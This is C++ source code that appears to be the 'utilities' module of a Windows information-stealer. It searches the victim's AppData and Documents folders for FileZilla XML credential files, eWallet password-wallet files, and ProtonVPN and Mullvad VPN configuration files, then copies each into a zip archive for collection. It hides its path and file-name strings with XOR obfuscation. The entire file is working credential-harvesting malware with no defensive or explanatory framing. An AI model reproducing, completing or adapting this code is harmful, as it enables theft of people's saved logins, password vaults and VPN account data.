#include "utilities.h"

#include "../../winapi/winapi.h"

#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/globals/globals.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/directories/directories.h"

#include <filesystem>

utilities g_utilities;

namespace fs = std::filesystem;

void utilities::is_filezilla(std::string path)
{
	for (auto &p : fs::recursive_directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".xml"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".xml"));
			std::string file_name = std::string(XOR_STRING("Utilities/FileZilla/")) + p.path().stem().string() + std::string(XOR_STRING(".xml"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void utilities::is_ewallet(std::string system_disk, std::string user_name)
{
	for (auto &p : fs::recursive_directory_iterator(g_dir.get_documents().c_str()))
	{
		if (p.path().extension() == XOR_STRING(".wlt"))
		{
			std::string from = g_dir.get_documents().c_str() + p.path().stem().string() + std::string(XOR_STRING(".wlt"));
			std::string file_name = std::string(XOR_STRING("Utilities/eWallet/")) + p.path().stem().string() + std::string(XOR_STRING(".wlt"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void utilities::is_protonvpn(std::string path)
{
	for (auto &p : fs::recursive_directory_iterator(path.c_str()))
	{
		if (p.path().filename() == XOR_STRING("user.config"))
		{
			std::string from = p.path().string().c_str();
			std::string file_name = std::string(XOR_STRING("Utilities/ProtonVPN/")) + p.path().filename().string().c_str();
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void utilities::is_mullvadvpn(std::string path)
{
	for (auto &p : fs::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".json"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".json"));
			std::string file_name = std::string(XOR_STRING("Utilities/MullvadVPN/")) + p.path().stem().string() + std::string(XOR_STRING(".json"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void utilities::run()
{
	std::string user_name = g_tools.get_user_name();
	std::string system_disk = g_tools.get_system_disk();

	std::string filezilla_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("FileZilla\\"));
	std::string ewallet_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Ilium Software\\eWallet\\"));
	std::string protonvpn_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("ProtonVPN\\"));
	std::string mullvadvpn_dir = g_dir.get_windows() + std::string(XOR_STRING("System32\\config\\systemprofile\\AppData\\Local\\Mullvad VPN\\"));

	if (g_tools.check_directory(filezilla_dir.c_str()) == DIR_FOUNDED)
	{
		is_filezilla(filezilla_dir.c_str());
		g_globals.utilities_count++;
	}

	if (g_tools.check_directory(ewallet_dir.c_str()) == DIR_FOUNDED)
	{
		is_ewallet(system_disk.c_str(), user_name.c_str());
		g_globals.utilities_count++;
	}

	if (g_tools.check_directory(protonvpn_dir.c_str()) == DIR_FOUNDED)
	{
		is_protonvpn(protonvpn_dir.c_str());
		g_globals.utilities_count++;
	}

	if (g_tools.check_directory(mullvadvpn_dir.c_str()) == DIR_FOUNDED)
	{
		is_mullvadvpn(mullvadvpn_dir.c_str());
		g_globals.utilities_count++;
	}
}